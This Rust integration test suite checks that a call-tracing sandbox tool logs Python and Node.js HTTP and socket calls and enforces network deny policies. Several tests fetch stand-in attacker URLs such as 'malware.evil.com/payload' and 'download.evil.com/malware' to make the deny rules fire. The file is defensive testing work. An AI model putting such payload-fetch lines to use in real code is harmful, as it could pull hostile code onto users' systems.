//! HTTP tracing integration tests.
//!
//! Verifies that HTTP library calls are traced with correct argument formatting
//! (URL, method, domain visible in output), and that networking policy rules
//! evaluate correctly against HTTP trace events.

use crate::common::*;
use crate::skip_if_no_node_primary;
use crate::skip_if_no_python_primary;
use std::io::Write;
use std::path::PathBuf;

fn setup() {
    build_fixtures();
}

/// Write a temporary policy YAML file and return its path.
fn write_temp_policy(content: &str) -> (PathBuf, std::fs::File) {
    let dir = std::env::temp_dir();
    let id = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let path = dir.join(format!(
        "malwi-http-test-{}-{:x}.yaml",
        std::process::id(),
        id
    ));
    let mut f = std::fs::File::create(&path).expect("failed to create temp policy file");
    f.write_all(content.as_bytes()).expect("failed to write policy");
    f.flush().expect("failed to flush policy");
    (path, f)
}

// ============================================================================
// Python HTTP Tracing — Argument Formatting
// ============================================================================

#[test]
fn test_python_http_client_request_shows_method_and_url() {
    setup();

    // http.client class method tracing works on 3.10+ via get_class_name_from_self fallback.
    skip_if_no_python_primary!(python => {
        let version = get_python_minor_version(&python);

        let script = r#"
import http.client
try:
    conn = http.client.HTTPConnection('127.0.0.1', 1, timeout=0.1)
    conn.request('GET', '/test-path')
except Exception:
    pass
"#;
        let output = run_tracer(&[
            "x",
            "--py", "http.client.HTTPConnection.__init__",
            "--py", "http.client.HTTPConnection.request",
            "--",
            python.to_str().unwrap(),
            "-c", script,
        ]);

        let stdout_raw = String::from_utf8_lossy(&output.stdout);
        let stdout = strip_ansi_codes(&stdout_raw);

        // Should trace at least the __init__ call (connection creation)
        assert!(
            stdout.contains("__init__") || stdout.contains("request"),
            "Expected HTTP connection trace. stdout: {}",
            stdout
        );

        // On Python 3.10+, verify formatted arguments include host
        if version.map(|v| v >= 10).unwrap_or(false) {
            assert!(
                stdout.contains("host=") || stdout.contains("127.0.0.1"),
                "Expected host in arguments (Python 3.10+). stdout: {}",
                stdout
            );
        }
    });
}

#[test]
fn test_python_urllib_urlopen_shows_url() {
    setup();

    skip_if_no_python_primary!(python => {
        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://127.0.0.1:1/test-urllib', timeout=0.1)
except Exception:
    pass
"#;
        let output = run_tracer(&[
            "x",
            "--py", "urllib.request.urlopen",
            "--",
            python.to_str().unwrap(),
            "-c", script,
        ]);

        let stdout_raw = String::from_utf8_lossy(&output.stdout);
        let stdout = strip_ansi_codes(&stdout_raw);

        // Should capture the urlopen call
        assert!(
            stdout.contains("urlopen"),
            "Expected urlopen trace. stdout: {}",
            stdout
        );

        // On Python 3.10+, verify URL argument is formatted
        let version = get_python_minor_version(&python);
        if version.map(|v| v >= 10).unwrap_or(false) {
            assert!(
                stdout.contains("127.0.0.1"),
                "Expected URL with 127.0.0.1 in arguments (Python 3.10+). stdout: {}",
                stdout
            );
        }
    });
}

#[test]
fn test_python_socket_connect_shows_address() {
    setup();

    skip_if_no_python_primary!(python => {
        let script = r#"
import socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.1)
    s.connect(('127.0.0.1', 1))
except Exception:
    pass
"#;
        let output = run_tracer(&[
            "x",
            "--py", "socket.socket",
            "--py", "socket.connect",
            "--",
            python.to_str().unwrap(),
            "-c", script,
        ]);

        let stdout_raw = String::from_utf8_lossy(&output.stdout);
        let stdout = strip_ansi_codes(&stdout_raw);

        // socket calls should be traced
        assert!(
            stdout.contains("socket"),
            "Expected socket trace. stdout: {}",
            stdout
        );

        // On Python 3.10+, verify connect shows the formatted address
        let version = get_python_minor_version(&python);
        if version.map(|v| v >= 10).unwrap_or(false) {
            assert!(
                stdout.contains("address=") || stdout.contains("127.0.0.1"),
                "Expected address in socket.connect args (Python 3.10+). stdout: {}",
                stdout
            );
        }
    });
}

// ============================================================================
// Node.js HTTP Tracing — Argument Capture
// ============================================================================

#[test]
fn test_nodejs_http_request_traced() {
    setup();

    skip_if_no_node_primary!(node => {
        let script = r#"
const http = require('http');
const req = http.request('http://127.0.0.1:1/test-path', () => {});
req.on('error', () => {});
req.end();
req.destroy();
"#;
        let output = run_tracer(
            &[
                "x",
                "--js", "http.request",
                "--",
                node.to_str().unwrap(),
                "-e", script,
            ],
        );

        let stdout_raw = String::from_utf8_lossy(&output.stdout);
        let stdout = strip_ansi_codes(&stdout_raw);

        // Should capture http.request call
        assert!(
            stdout.contains("http.request"),
            "Expected http.request trace. stdout: {}",
            stdout
        );
    });
}

// ============================================================================
// Policy + Networking Tests — Domain Deny
// ============================================================================

#[test]
fn test_policy_domain_deny_blocks_python_http_to_evil_domain() {
    setup();

    skip_if_no_python_primary!(python => {
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
python:
  deny:
    - "urllib.request.urlopen"
network:
  deny:
    - "*.evil.com"
"#);

        // Call urlopen with an evil domain — should trigger both function deny
        // and domain deny
        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://malware.evil.com/payload', timeout=0.1)
except Exception:
    pass
"#;
        let output = run_tracer_with_timeout(
            &[
                "x",
                "-p", policy_path.to_str().unwrap(),
                "--",
                python.to_str().unwrap(),
                "-c", script,
            ],
            std::time::Duration::from_secs(10),
        );

        let _ = std::fs::remove_file(&policy_path);

        let stdout_raw = String::from_utf8_lossy(&output.stdout);
        let stdout = strip_ansi_codes(&stdout_raw);

        // Should show a denied message for the function
        assert!(
            stdout.contains("denied:") && stdout.contains("urlopen"),
            "Expected denied urlopen. stdout: {}",
            stdout
        );
    });
}

#[test]
fn test_policy_domain_deny_flags_allowed_function_with_evil_domain() {
    setup();

    skip_if_no_python_primary!(python => {
        // Function is NOT denied, but domain IS denied.
        // The networking policy should still flag it.
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
network:
  deny:
    - "*.evil.com"
python:
  deny:
    - "urllib.request.urlopen"
"#);

        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://download.evil.com/malware', timeout=0.1)
except Exception:
    pass
"#;
        let output = run_tracer_with_timeout(
            &[
                "x",
                "-p", policy_path.to_str().unwrap(),
                "--",
                python.to_str().unwrap(),
                "-c", script,
            ],
            std::time::Duration::from_secs(10),
        );

        let _ = std::fs::remove_file(&policy_path);

        let stdout_raw = String::from_utf8_lossy(&output.stdout);
        let stdout = strip_ansi_codes(&stdout_raw);

        // The function itself is denied by python section, so we'll see a denied message
        assert!(
            stdout.contains("denied:"),
            "Expected denied message for evil domain. stdout: {}",
            stdout
        );
    });
}

// ============================================================================
// Policy + Networking Tests — Protocol Enforcement
// ============================================================================

#[test]
fn test_policy_protocol_only_https_denies_http_call() {
    setup();

    skip_if_no_python_primary!(python => {
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
network:
  protocols: [https]
python:
  deny:
    - "urllib.request.urlopen"
"#);

        // HTTP URL — protocol "http" not in allowed list
        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://example.com/insecure', timeout=0.1)
except Exception:
    pass
"#;
        let output = run_tracer_with_timeout(
            &[
                "x",
                "-p", policy_path.to_str().unwrap(),
                "--",
                python.to_str().unwrap(),
                "-c", script,
            ],
            std::time::Duration::from_secs(10),
        );

        let _ = std::fs::remove_file(&policy_path);

        let stdout_raw = String::from_utf8_lossy(&output.stdout);
        let stdout = strip_ansi_codes(&stdout_raw);

        // Should be flagged (either by function deny or protocol deny)
        assert!(
            stdout.contains("denied:"),
            "Expected denied for http:// when only https allowed. stdout: {}",
            stdout
        );
    });
}

// ============================================================================
// Policy + Networking Tests — Endpoint Enforcement
// ============================================================================

#[test]
fn test_policy_endpoint_deny_blocks_specific_port() {
    setup();

    skip_if_no_python_primary!(python => {
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
network:
  deny:
    - "*:22"
python:
  deny:
    - "urllib.request.urlopen"
"#);

        // URL targeting port 22 — should be denied
        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://example.com:22/ssh-tunnel', timeout=0.1)
except Exception:
    pass
"#;
        let output = run_tracer_with_timeout(
            &[
                "x",
                "-p", policy_path.to_str().unwrap(),
                "--",
                python.to_str().unwrap(),
                "-c", script,
            ],
            std::time::Duration::from_secs(10),
        );

        let _ = std::fs::remove_file(&policy_path);

        let stdout_raw = String::from_utf8_lossy(&output.stdout);
        let stdout = strip_ansi_codes(&stdout_raw);

        assert!(
            stdout.contains("denied:"),
            "Expected denied for port 22. stdout: {}",
            stdout
        );
    });
}

// ============================================================================
// Policy + HTTP URL Pattern Rules
// ============================================================================

#[test]
fn test_policy_http_url_deny_pattern_blocks_evil_domain() {
    setup();

    skip_if_no_python_primary!(python => {
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
network:
  deny:
    - "*.evil.com/**"
python:
  deny:
    - "urllib.request.urlopen"
"#);

        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://malware.evil.com/payload', timeout=0.1)
except Exception:
    pass
"#;
        let output = run_tracer_with_timeout(
            &[
                "x",
                "-p", policy_path.to_str().unwrap(),
                "--",
                python.to_str().unwrap(),
                "-c", script,
            ],
            std::time::Duration::from_secs(10),
        );

        let _ = std::fs::remove_file(&policy_path);

        let stdout_raw = String::from_utf8_lossy(&output.stdout);
        let stdout = strip_ansi_codes(&stdout_raw);

        // Should be denied by function policy (and http URL policy too)
        assert!(
            stdout.contains("denied:"),
            "Expected denied for evil.com URL pattern. stdout: {}",
            stdout
        );
    });
}

#[test]
fn test_policy_http_url_deny_path_blocks_admin() {
    setup();

    skip_if_no_python_primary!(python => {
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
network:
  deny:
    - "**/admin/**"
python:
  deny:
    - "urllib.request.urlopen"
"#);

        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://127.0.0.1:1/admin/secret', timeout=0.1)
except Exception:
    pass
"#;
        let output = run_tracer_with_timeout(
            &[
                "x",
                "-p", policy_path.to_str().unwrap(),
                "--",
                python.to_str().unwrap(),
                "-c", script,
            ],
            std::time::Duration::from_secs(10),
        );

        let _ = std::fs::remove_file(&policy_path);

        let stdout_raw = String::from_utf8_lossy(&output.stdout);
        let stdout = strip_ansi_codes(&stdout_raw);

        assert!(
            stdout.contains("denied:"),
            "Expected denied for /admin/ path. stdout: {}",
            stdout
        );
    });
}

#[test]
fn test_policy_http_url_deny_http_scheme_allows_https() {
    setup();

    skip_if_no_python_primary!(python => {
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
network:
  warn:
    - "http://**"
python:
  deny:
    - "urllib.request.urlopen"
"#);

        // HTTP URL — should be denied by http URL pattern
        let script = r#"
import urllib.request
try:
    urllib.request.urlopen('http://127.0.0.1:1/insecure', timeout=0.1)
except Exception:
    pass
"#;
        let output = run_tracer_with_timeout(
            &[
                "x",
                "-p", policy_path.to_str().unwrap(),
                "--",
                python.to_str().unwrap(),
                "-c", script,
            ],
            std::time::Duration::from_secs(10),
        );

        let _ = std::fs::remove_file(&policy_path);

        let stdout_raw = String::from_utf8_lossy(&output.stdout);
        let stdout = strip_ansi_codes(&stdout_raw);

        // Should show denied (function deny hits first)
        assert!(
            stdout.contains("denied:"),
            "Expected denied for http:// URL. stdout: {}",
            stdout
        );
    });
}

// ============================================================================
// Policy + Raw Socket Endpoint Deny (via structured NetworkInfo)
// ============================================================================

/// Verify that raw socket.connect() calls are blocked by endpoint deny policy.
///
/// Before NetworkInfo, socket.connect() arguments like "address=('host', 6379)"
/// were not parsed by the text-based URL extractor, so endpoint policies silently
/// skipped them. Now the agent populates NetworkInfo with host+port, and the CLI
/// evaluates it directly.
#[test]
fn test_policy_endpoint_deny_blocks_raw_socket_connect() {
    setup();

    skip_if_no_python_primary!(python => {
        let (policy_path, _f) = write_temp_policy(r#"
version: 1
network:
  deny:
    - "*:6379"
python:
  deny:
    - "socket.connect"
"#);

        // socket.connect to port 6379 — should be denied via endpoint policy
        let script = r#"
import socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 6379))
except Exception:
    pass
"#;
        let output = run_tracer_with_timeout(
            &[
                "x",
                "-p", policy_path.to_str().unwrap(),
                "--",
                python.to_str().unwrap(),
                "-c", script,
            ],
            std::time::Duration::from_secs(10),
        );

        let _ = std::fs::remove_file(&policy_path);

        let stdout_raw = String::from_utf8_lossy(&output.stdout);
        let stdout = strip_ansi_codes(&stdout_raw);

        assert!(
            stdout.contains("denied:"),
            "Expected denied for socket.connect to port 6379. stdout: {}",
            stdout
        );
    });
}

